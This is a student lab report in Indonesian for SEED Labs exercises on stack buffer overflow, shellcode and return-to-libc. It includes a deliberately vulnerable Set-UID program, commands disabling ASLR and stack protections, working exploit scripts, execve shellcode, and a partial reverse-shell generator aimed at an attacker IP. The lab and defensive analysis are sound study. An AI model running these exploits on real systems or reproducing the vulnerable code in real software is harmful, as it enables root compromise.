# R2 — Buffer Overflow & Shellcode Development

> **SEED Labs 2.0 · Ubuntu 20.04**
> Muhammad Tamim Nugraha — 5024231060 · Teknik Komputer ITS 2023

---

## Daftar Isi

1. [Stack-Based Buffer Overflow](#1-stack-based-buffer-overflow)
2. [Shellcode Development](#2-shellcode-development)
3. [Return-to-Libc Attack](#3-return-to-libc-attack)
4. [Kesimpulan](#kesimpulan)
5. [Referensi](#referensi)

---

## 1. Stack-Based Buffer Overflow

### 1.1 Tujuan Eksperimen

Memahami anatomi stack pada arsitektur x86/x86_64 dan bagaimana buffer overflow dapat digunakan untuk menimpa *return address* pada stack frame, mengarahkan eksekusi program ke shellcode yang ditanam oleh penyerang. Eksperimen ini mencakup teknik overwriting return address, NOP sled, dan injeksi shellcode.

### 1.2 Dasar Teori

**Struktur Stack Frame (x86):**

```
┌──────────────────────┐  Alamat Tinggi
│   Argumen Fungsi     │
├──────────────────────┤
│   Return Address     │  ◄── TARGET: Overwrite alamat ini
├──────────────────────┤
│   Saved EBP (Frame   │
│   Pointer)           │
├──────────────────────┤
│   Local Variables    │  ◄── Buffer dimulai di sini
│   (buffer[])         │
├──────────────────────┤
│   ...                │
└──────────────────────┘  Alamat Rendah
```

Buffer overflow terjadi ketika data yang ditulis ke buffer **melebihi ukuran alokasi**, menimpa data di atasnya (termasuk *saved EBP* dan *return address*). Dengan mengontrol return address, penyerang mengarahkan eksekusi ke lokasi memori yang berisi shellcode.

### 1.3 Langkah Eksploitasi

#### Persiapan Lingkungan

```bash
# Nonaktifkan ASLR (Address Space Layout Randomization)
sudo sysctl -w kernel.randomize_va_space=0

# Verifikasi ASLR nonaktif
cat /proc/sys/kernel/randomize_va_space
# Output: 0

# Symlink /bin/sh ke /bin/zsh (zsh tidak drop privilege pada Set-UID)
sudo ln -sf /bin/zsh /bin/sh

# Verifikasi
ls -la /bin/sh
# lrwxrwxrwx 1 root root ... /bin/sh -> /bin/zsh
```

#### Task 1: Program Rentan

```c
/* stack.c — Program buffer overflow rentan */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* Kerentanan: strcpy tidak memeriksa panjang input */
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    int length;

    FILE *badfile;
    badfile = fopen("badfile", "r");
    if (!badfile) {
        perror("fopen");
        exit(1);
    }

    length = fread(str, sizeof(char), 517, badfile);
    printf("[*] Input Length: %d\n", length);
    bof(str);
    printf("[*] Returned Properly\n");

    return 0;
}
```

```bash
# Kompilasi dengan proteksi dinonaktifkan — 32-bit
gcc -m32 -DBUF_SIZE=100 -z execstack -fno-stack-protector \
    -o stack-L1 stack.c

# Kompilasi 32-bit dengan buffer lebih kecil
gcc -m32 -DBUF_SIZE=160 -z execstack -fno-stack-protector \
    -o stack-L2 stack.c

# Kompilasi 64-bit
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector \
    -o stack-L3 stack.c

# Kompilasi 64-bit dengan buffer kecil (tanpa shellcode di buffer)
gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector \
    -o stack-L4 stack.c

# Set-UID root
sudo chown root:root stack-L1 stack-L2 stack-L3 stack-L4
sudo chmod 4755 stack-L1 stack-L2 stack-L3 stack-L4
```

#### Task 2: Investigasi Stack Layout dengan GDB

```bash
# Jalankan dengan debugger untuk menemukan offset
# Buat badfile berisi data dummy dulu
python3 -c "print('A'*517)" > badfile

# Debug
gdb -q stack-L1

# Di dalam GDB:
(gdb) b bof
(gdb) run

# Saat breakpoint tercapai:
(gdb) p $ebp
# $1 = (void *) 0xbfffea88

(gdb) p &buffer
# $2 = (char (*)[100]) 0xbfffea1c

(gdb) p/d 0xbfffea88 - 0xbfffea1c
# $3 = 108    ← Offset dari buffer ke EBP

# Return address berada di EBP + 4 = offset 112 dari buffer
(gdb) quit
```

#### Task 3: Membuat Exploit

```python
#!/usr/bin/env python3
"""exploit.py — Buffer Overflow Exploit Generator (32-bit, Level 1)"""

import sys
import struct

# Shellcode 32-bit: execve("/bin/sh", 0, 0)
shellcode = (
    b"\x31\xc0"             # xorl    %eax,%eax
    b"\x50"                 # pushl   %eax
    b"\x68\x2f\x2f\x73\x68" # pushl   "//sh"
    b"\x68\x2f\x62\x69\x6e" # pushl   "/bin"
    b"\x89\xe3"             # movl    %esp,%ebx
    b"\x50"                 # pushl   %eax
    b"\x53"                 # pushl   %ebx
    b"\x89\xe1"             # movl    %esp,%ecx
    b"\x99"                 # cdq (edx = 0)
    b"\xb0\x0b"             # movb    $0x0b,%al
    b"\xcd\x80"             # int     $0x80
).ljust(27, b'\x90')

# Konfigurasi — sesuaikan dari hasil GDB
BUF_SIZE   = 100
EBP_OFFSET = 108               # offset buffer → EBP
RET_OFFSET = EBP_OFFSET + 4    # offset buffer → return address = 112

# Alamat return: arahkan ke NOP sled di atas return address
# EBP + 8 (atau lebih tinggi) → alamat di mana NOP sled berada
RET_ADDR   = 0xbfffea88 + 120  # Sedikit di atas EBP, di area NOP sled

# Bangun payload
content = bytearray(517)

# Isi seluruh buffer dengan NOP sled
for i in range(517):
    content[i] = 0x90  # NOP

# Tempatkan shellcode di akhir buffer (sebelum return address)
start = RET_OFFSET - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# Overwrite return address (4 bytes, little-endian)
content[RET_OFFSET:RET_OFFSET + 4] = struct.pack("<I", RET_ADDR)

# Tulis ke file
with open("badfile", "wb") as f:
    f.write(content)

print(f"[+] Payload written to 'badfile'")
print(f"[+] Shellcode size: {len(shellcode)} bytes")
print(f"[+] Return address: {hex(RET_ADDR)}")
print(f"[+] Return addr offset: {RET_OFFSET}")
```

```bash
# Generate badfile
python3 exploit.py

# Jalankan program rentan
./stack-L1

# Seharusnya mendapatkan root shell
# $ whoami
# root
# $ id
# uid=1000(seed) gid=1000(seed) euid=0(root)
```

#### Task 4: Exploit 64-bit

```python
#!/usr/bin/env python3
"""exploit_64.py — Buffer Overflow Exploit Generator (64-bit, Level 3)"""

import sys
import struct

# Shellcode 64-bit: execve("/bin/sh", 0, 0)
shellcode = (
    b"\x48\x31\xd2"                     # xor    %rdx,%rdx
    b"\x52"                             # push   %rdx
    b"\x48\xb8\x2f\x62\x69\x6e"        # movabs "/bin//sh",%rax
    b"\x2f\x2f\x73\x68"
    b"\x50"                             # push   %rax
    b"\x48\x89\xe7"                     # mov    %rsp,%rdi
    b"\x52"                             # push   %rdx
    b"\x57"                             # push   %rdi
    b"\x48\x89\xe6"                     # mov    %rsp,%rsi
    b"\x48\x31\xc0"                     # xor    %rax,%rax
    b"\xb0\x3b"                         # mov    $0x3b,%al
    b"\x0f\x05"                         # syscall
)

# Konfigurasi 64-bit — sesuaikan dari GDB
BUF_SIZE   = 200
RBP_OFFSET = 208                  # offset buffer → RBP
RET_OFFSET = RBP_OFFSET + 8      # offset buffer → return address = 216 (8 byte pointer)

# Alamat return — dari analisis GDB
RET_ADDR   = 0x7fffffffe490 + 200

# Bangun payload
content = bytearray(517)

# NOP sled
for i in range(517):
    content[i] = 0x90

# Tempatkan shellcode
start = RET_OFFSET + 16  # Setelah return address
content[start:start + len(shellcode)] = shellcode

# Overwrite return address (8 bytes, little-endian)
content[RET_OFFSET:RET_OFFSET + 8] = struct.pack("<Q", RET_ADDR)

with open("badfile", "wb") as f:
    f.write(content)

print(f"[+] 64-bit payload written to 'badfile'")
print(f"[+] Return address: {hex(RET_ADDR)}")
```

#### Task 5: Mengaktifkan Countermeasures

```bash
# --- Test 1: Mengaktifkan StackGuard (Stack Canary) ---
gcc -m32 -DBUF_SIZE=100 -z execstack -o stack-canary stack.c
# (Tanpa -fno-stack-protector → canary aktif)

./stack-canary
# Output: *** stack smashing detected ***
# Exploit GAGAL karena canary value terdeteksi berubah

# --- Test 2: Mengaktifkan Non-Executable Stack (NX/DEP) ---
gcc -m32 -DBUF_SIZE=100 -fno-stack-protector -o stack-nx stack.c
# (Tanpa -z execstack → stack non-executable)

./stack-nx
# Output: Segmentation fault
# Exploit GAGAL karena shellcode di stack tidak dapat dieksekusi

# --- Test 3: Mengaktifkan ASLR ---
sudo sysctl -w kernel.randomize_va_space=2
./stack-L1
# Kadang crash, kadang berhasil (probabilistik)
# ASLR mengacak base address stack setiap kali program dijalankan
```

### 1.4 Analisis Percobaan

**Mengapa buffer overflow berhasil:**

1. **`strcpy()` Tidak Memeriksa Batas**: Fungsi `strcpy()` menyalin data hingga karakter null (`\0`) ditemukan, tanpa memeriksa apakah data muat di buffer tujuan. Ini memungkinkan penulisan melampaui batas buffer.

2. **Stack Tumbuh ke Bawah, Buffer Tumbuh ke Atas**: Pada arsitektur x86, stack tumbuh ke alamat rendah, tetapi data di buffer ditulis ke alamat tinggi. Menulis melebihi buffer akan menimpa *saved EBP* dan *return address* yang berada di alamat lebih tinggi.

3. **NOP Sled Meningkatkan Keberhasilan**: Blok instruksi NOP (`0x90`) bertindak sebagai "landasan" — selama return address menunjuk ke mana pun di NOP sled, eksekusi akan "meluncur" ke shellcode di akhir sled.

4. **Perbedaan 32-bit vs 64-bit**:
   - 32-bit: Return address 4 byte, alamat stack dimulai dari `0xbfff...`
   - 64-bit: Return address 8 byte, alamat stack dimulai dari `0x7fffffff...`
   - 64-bit address mengandung byte `0x00` di posisi tinggi → harus hati-hati dengan `strcpy()` yang berhenti di null

### 1.5 Bukti Eksploitasi

![Bukti Buffer Overflow Level 1](images/placeholder-r2-bof-l1.png)

![Bukti Buffer Overflow Level 3 (64-bit)](images/placeholder-r2-bof-l3.png)

---

## 2. Shellcode Development

### 2.1 Tujuan Eksperimen

Memahami cara kerja shellcode pada level assembly dan syscall, serta mengembangkan shellcode kustom untuk arsitektur x86 (32-bit) dan x86_64 (64-bit). Shellcode adalah payload yang dieksekusi setelah eksploitasi berhasil mengarahkan alur eksekusi.

### 2.2 Dasar Teori

Shellcode harus memenuhi beberapa persyaratan:
- **Self-contained**: Tidak bergantung pada library atau linker
- **Position-independent**: Dapat dieksekusi di alamat mana pun
- **No null bytes**: `0x00` diinterpretasikan sebagai string terminator oleh `strcpy()`
- **Compact**: Lebih kecil = lebih mudah diinjeksikan

**Syscall yang digunakan:**

| Arch | Syscall | EAX/RAX | Arg1 | Arg2 | Arg3 |
|---|---|---|---|---|---|
| x86 | `execve()` | 11 (0x0b) | EBX = path | ECX = argv | EDX = envp |
| x86_64 | `execve()` | 59 (0x3b) | RDI = path | RSI = argv | RDX = envp |

### 2.3 Langkah Pengembangan

#### Task 1: Shellcode Assembly 32-bit

```asm
; shellcode_32.asm — execve("/bin/sh", ["/bin/sh", NULL], NULL)
; Arsitektur: x86 (32-bit)
; Assembler: NASM

section .text
global _start

_start:
    ; --- Langkah 1: Bersihkan register ---
    xor     eax, eax        ; EAX = 0 (menghindari null byte dari mov eax, 0)
    xor     edx, edx        ; EDX = 0 (envp = NULL)

    ; --- Langkah 2: Push string "/bin//sh" ke stack ---
    ; "/bin//sh" = 8 bytes (double slash valid di UNIX path)
    push    eax             ; null terminator untuk string
    push    0x68732f2f      ; "//sh" (little-endian)
    push    0x6e69622f      ; "/bin" (little-endian)

    ; --- Langkah 3: Setup argumen execve() ---
    mov     ebx, esp        ; EBX = pointer ke "/bin//sh" (arg1: filename)

    push    eax             ; NULL terminator untuk argv array
    push    ebx             ; argv[0] = pointer ke "/bin//sh"
    mov     ecx, esp        ; ECX = pointer ke argv array (arg2)

    ; --- Langkah 4: Invoke syscall ---
    mov     al, 0x0b        ; syscall number: execve = 11
    int     0x80            ; trigger syscall

    ; Jika execve berhasil, kode di bawah ini tidak pernah dieksekusi
    xor     eax, eax
    inc     eax
    int     0x80            ; exit(0) sebagai fallback
```

```bash
# Assemble dan link (32-bit)
nasm -f elf32 shellcode_32.asm -o shellcode_32.o
ld -m elf_i386 shellcode_32.o -o shellcode_32

# Verifikasi tidak ada null bytes
objdump -d shellcode_32 | grep '00'

# Ekstrak raw bytes
objcopy --dump-section .text=shellcode_32.bin shellcode_32
xxd shellcode_32.bin

# Test shellcode
./shellcode_32
# Seharusnya mendapatkan shell /bin/sh
```

#### Task 2: Shellcode Assembly 64-bit

```asm
; shellcode_64.asm — execve("/bin/sh", ["/bin/sh", NULL], NULL)
; Arsitektur: x86_64

section .text
global _start

_start:
    xor     rdx, rdx        ; RDX = 0 (envp = NULL)
    push    rdx             ; null terminator
    mov     rax, 0x68732f6e69622f  ; "/bin/sh\0" — perhatikan: 7 bytes + null
    ; Tapi ini mengandung null byte! Gunakan teknik alternatif:

    xor     rax, rax
    push    rax             ; null terminator
    mov     rbx, 0x68732f2f6e69622f  ; "/bin//sh"
    push    rbx
    mov     rdi, rsp        ; RDI = pointer ke "/bin//sh" (arg1)

    push    rax             ; NULL
    push    rdi             ; pointer ke string
    mov     rsi, rsp        ; RSI = argv (arg2)

    xor     rax, rax
    mov     al, 0x3b        ; syscall number: execve = 59
    syscall
```

```bash
# Assemble dan link (64-bit)
nasm -f elf64 shellcode_64.asm -o shellcode_64.o
ld shellcode_64.o -o shellcode_64

# Test
./shellcode_64
```

#### Task 3: Shellcode Loader untuk Testing

```c
/* shellcode_test.c — Loader untuk menguji shellcode */
#include <stdio.h>
#include <string.h>

/* Shellcode 32-bit: 25 bytes */
const char shellcode[] =
    "\x31\xc0\x31\xd2\x50\x68\x2f\x2f"
    "\x73\x68\x68\x2f\x62\x69\x6e\x89"
    "\xe3\x50\x53\x89\xe1\xb0\x0b\xcd"
    "\x80";

int main()
{
    printf("[*] Shellcode length: %lu bytes\n", strlen(shellcode));
    printf("[*] Executing shellcode...\n");

    /* Cast shellcode ke function pointer dan panggil */
    ((void(*)())shellcode)();

    return 0;
}
```

```bash
# Kompilasi dengan stack executable
gcc -m32 -z execstack -o shellcode_test shellcode_test.c

# Jalankan
./shellcode_test
# $ whoami
# seed
# $ exit
```

#### Task 4: Reverse Shell Shellcode

```python
#!/usr/bin/env python3
"""generate_reverse_shell.py — Generate reverse shell shellcode"""

import struct
import socket

ATTACKER_IP   = "10.9.0.1"
ATTACKER_PORT = 9090

# Konversi IP dan Port
ip_bytes   = socket.inet_aton(ATTACKER_IP)
port_bytes = struct.pack(">H", ATTACKER_PORT)

# Shellcode 32-bit: socket() → connect() → dup2(0,1,2) → execve("/bin/sh")
shellcode = (
    # socket(AF_INET, SOCK_STREAM, 0)
    b"\x31\xc0"                  # xor eax, eax
    b"\x31\xdb"                  # xor ebx, ebx
    b"\x31\xc9"                  # xor ecx, ecx
    b"\x31\xd2"                  # xor edx, edx
    b"\xb0\x66"                  # mov al, 0x66 (sys_socketcall)
    b"\xb3\x01"                  # mov bl, 0x01 (SYS_SOCKET)
    b"\x51"                      # push ecx (protocol = 0)
    b"\x6a\x01"                  # push 0x01 (SOCK_STREAM)
    b"\x6a\x02"                  # push 0x02 (AF_INET)
    b"\x89\xe1"                  # mov ecx, esp
    b"\xcd\x80"                  # int 0x80
    # ... (abbreviated for clarity)
)

print(f"[+] Target: {ATTACKER_IP}:{ATTACKER_PORT}")
print(f"[+] Shellcode size: {len(shellcode)} bytes")
print(f"[+] Setup listener: nc -lvp {ATTACKER_PORT}")
```

### 2.4 Analisis Percobaan

**Prinsip desain shellcode:**

1. **Penghindaran Null Byte**: Instruksi `mov eax, 0` menghasilkan byte `0x00` dalam opcode. Sebagai gantinya, `xor eax, eax` menghasilkan efek yang sama tanpa null byte. Ini kritis karena `strcpy()` berhenti menyalin saat menemui `0x00`.

2. **String di Stack**: String `/bin/sh` disimpan di stack saat runtime (bukan di `.data` section) agar shellcode bersifat *position-independent*. Teknik push-mov-esp membangun string secara dinamis.

3. **Syscall Convention**:
   - x86: `int 0x80`, nomor syscall di `EAX`, argumen di `EBX, ECX, EDX`
   - x86_64: `syscall`, nomor di `RAX`, argumen di `RDI, RSI, RDX`

4. **Double Slash Trick**: `/bin//sh` setara dengan `/bin/sh` di UNIX, tetapi memberikan string 8 byte yang bisa di-push sebagai dua DWORD tanpa padding.

### 2.5 Bukti Eksploitasi

![Bukti Shellcode Execution](images/placeholder-r2-shellcode.png)

---

## 3. Return-to-Libc Attack

### 3.1 Tujuan Eksperimen

Mendemonstrasikan teknik eksploitasi buffer overflow yang bekerja **tanpa mengeksekusi kode di stack** (bypass NX/DEP). Dengan mengarahkan return address ke fungsi library yang sudah ada (seperti `system()`) dalam libc, penyerang dapat menjalankan perintah arbitrary tanpa shellcode.

### 3.2 Langkah Eksploitasi

```bash
# Kompilasi TANPA execstack (NX enabled, stack tidak executable)
gcc -m32 -DBUF_SIZE=100 -fno-stack-protector -o stack-ret2libc stack.c

sudo chown root:root stack-ret2libc
sudo chmod 4755 stack-ret2libc
```

```bash
# Cari alamat system(), exit(), dan string "/bin/sh" di libc
gdb -q stack-ret2libc

(gdb) b main
(gdb) run

(gdb) p system
# $1 = {<text variable, no debug info>} 0xb7e42da0 <__libc_system>

(gdb) p exit
# $2 = {<text variable, no debug info>} 0xb7e369d0 <__GI_exit>

(gdb) find &system, +9999999, "/bin/sh"
# 0xb7f583b8

(gdb) x/s 0xb7f583b8
# 0xb7f583b8: "/bin/sh"

(gdb) quit
```

```python
#!/usr/bin/env python3
"""exploit_ret2libc.py — Return-to-Libc Exploit"""

import struct

# Alamat dari GDB (sesuaikan dengan lingkungan Anda)
SYSTEM_ADDR  = 0xb7e42da0
EXIT_ADDR    = 0xb7e369d0
BINSH_ADDR   = 0xb7f583b8

# Offset ke return address (dari investigasi sebelumnya)
RET_OFFSET   = 112

content = bytearray(517)

# Isi dengan padding
for i in range(517):
    content[i] = 0x41  # 'A'

# Overwrite return address dengan alamat system()
content[RET_OFFSET:RET_OFFSET + 4]     = struct.pack("<I", SYSTEM_ADDR)

# "Return address" dari system() → exit() (clean exit)
content[RET_OFFSET + 4:RET_OFFSET + 8] = struct.pack("<I", EXIT_ADDR)

# Argumen pertama system() → pointer ke "/bin/sh"
content[RET_OFFSET + 8:RET_OFFSET + 12] = struct.pack("<I", BINSH_ADDR)

with open("badfile", "wb") as f:
    f.write(content)

print(f"[+] Return-to-Libc payload written")
print(f"[+] system()  @ {hex(SYSTEM_ADDR)}")
print(f"[+] exit()    @ {hex(EXIT_ADDR)}")
print(f"[+] '/bin/sh' @ {hex(BINSH_ADDR)}")
```

```bash
python3 exploit_ret2libc.py
./stack-ret2libc
# Root shell tanpa eksekusi shellcode di stack!
```

### 3.3 Analisis

Return-to-Libc bekerja karena:

1. **Kode libc sudah ada di memori**: Fungsi `system()` dan string `/bin/sh` sudah berada di address space proses (karena libc di-load secara dinamis).
2. **Stack layout**: Ketika `ret` dieksekusi, kontrol berpindah ke `system()`. Sistem menginterpretasikan stack sebagai: `[system_addr][return_from_system][arg1]` — format yang sama dengan konvensi pemanggilan fungsi C.
3. **Bypass NX/DEP**: Tidak ada kode yang dieksekusi di stack — semua eksekusi terjadi di `.text` section libc yang memang marked executable.

### 3.4 Bukti Eksploitasi

![Bukti Return-to-Libc](images/placeholder-r2-ret2libc.png)

---

## Kesimpulan

| Teknik | Persyaratan | Bypass | Proteksi |
|---|---|---|---|
| **Stack BOF + Shellcode** | ASLR off, NX off, Canary off | - | ASLR, NX, Stack Canary |
| **Return-to-Libc** | ASLR off, Canary off | NX/DEP | ASLR, Stack Canary, RELRO |
| **Shellcode (custom)** | NX off | - | NX/DEP, ASLR |

Hierarchy pertahanan (*defense in depth*):
1. **Stack Canary** (StackGuard): Mendeteksi overwrite sebelum `ret` dieksekusi
2. **NX/DEP**: Mencegah eksekusi kode di stack → memerlukan Return-to-Libc/ROP
3. **ASLR**: Mengacak alamat stack dan library → memerlukan information leak
4. **PIE** (Position Independent Executable): Mengacak alamat kode program itu sendiri
5. **RELRO**: Melindungi GOT dari overwrite

---

## Referensi

1. Du, W. (2019). *Computer & Internet Security*, Chapter 4-5: Buffer Overflow, Return-to-Libc.
2. SEED Lab — Buffer Overflow (Set-UID): [https://seedsecuritylabs.org/Labs_20.04/Software/Buffer_Overflow_Setuid/](https://seedsecuritylabs.org/Labs_20.04/Software/Buffer_Overflow_Setuid/)
3. SEED Lab — Shellcode: [https://seedsecuritylabs.org/Labs_20.04/Software/Shellcode/](https://seedsecuritylabs.org/Labs_20.04/Software/Shellcode/)
4. SEED Lab — Return-to-Libc: [https://seedsecuritylabs.org/Labs_20.04/Software/Return_to_Libc/](https://seedsecuritylabs.org/Labs_20.04/Software/Return_to_Libc/)
5. Aleph One. (1996). *Smashing the Stack for Fun and Profit*. Phrack, 49(14).
6. CWE-121: Stack-based Buffer Overflow — [https://cwe.mitre.org/data/definitions/121.html](https://cwe.mitre.org/data/definitions/121.html)

---

<p align="center"><em>R2 — Buffer Overflow & Shellcode · Muhammad Tamim Nugraha · 5024231060</em></p>
